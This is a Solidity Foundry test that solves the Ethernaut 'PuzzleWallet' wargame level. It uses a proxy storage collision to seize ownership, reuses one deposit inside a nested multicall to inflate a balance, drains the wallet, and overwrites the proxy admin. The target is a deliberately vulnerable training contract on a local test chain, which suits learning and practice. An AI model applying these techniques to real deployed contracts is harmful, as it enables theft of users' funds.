// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/PuzzleWallet/PuzzleWallet.sol";
import "../src/PuzzleWallet/PuzzleWalletFactory.sol";
import "../src/Ethernaut.sol";

contract PuzzleWalletTest is Test {
    Ethernaut private _ethernaut;
    PuzzleWalletFactory private _puzzleWalletFactory;
    PuzzleProxy private _puzzleProxy;

    address private _hacker = address(0xA);

    modifier testWrapper() {
        vm.deal(_hacker, 1 ether);
        _ethernaut.registerLevel(_puzzleWalletFactory);
        vm.startPrank(_hacker);
        address instance = _ethernaut.createLevelInstance{value: 0.001 ether}(
            _puzzleWalletFactory
        );
        _puzzleProxy = PuzzleProxy(payable(instance));
        _;
        bool success = _ethernaut.submitLevelInstance(
            payable(address(_puzzleProxy))
        );
        assertTrue(success);
        vm.stopPrank();
    }

    function setUp() public {
        _ethernaut = new Ethernaut();
        _puzzleWalletFactory = new PuzzleWalletFactory();
    }

    function testPuzzleWalletHack() public testWrapper {
        address puzzleProxy = address(_puzzleProxy);
        _puzzleProxy.proposeNewAdmin(_hacker);

        (bool addToWhitelistSuccess, ) = puzzleProxy.call(
            abi.encodeWithSignature("addToWhitelist(address)", _hacker)
        );
        require(addToWhitelistSuccess, "addToWhitelist failed");

        bytes[] memory data1 = new bytes[](1);
        data1[0] = abi.encodeWithSignature("deposit()");

        bytes[] memory data2 = new bytes[](2);
        data2[0] = data1[0];
        data2[1] = abi.encodeWithSignature("multicall(bytes[])", data1);

        (bool multicallSuccess, ) = puzzleProxy.call{value: 0.001 ether}(
            abi.encodeWithSignature("multicall(bytes[])", data2)
        );
        require(multicallSuccess, "multicall failed");

        (bool executeSuccess, ) = puzzleProxy.call(
            abi.encodeWithSignature(
                "execute(address,uint256,bytes)",
                _hacker,
                0.002 * 10 ** 18,
                ""
            )
        );
        require(executeSuccess, "execute failed");

        uint256 newMaxBalance = uint256(uint160(_hacker));
        (bool setMaxBalanceSuccess, ) = puzzleProxy.call(
            abi.encodeWithSignature("setMaxBalance(uint256)", newMaxBalance)
        );
        require(setMaxBalanceSuccess, "setMaxBalance failed");
    }
}
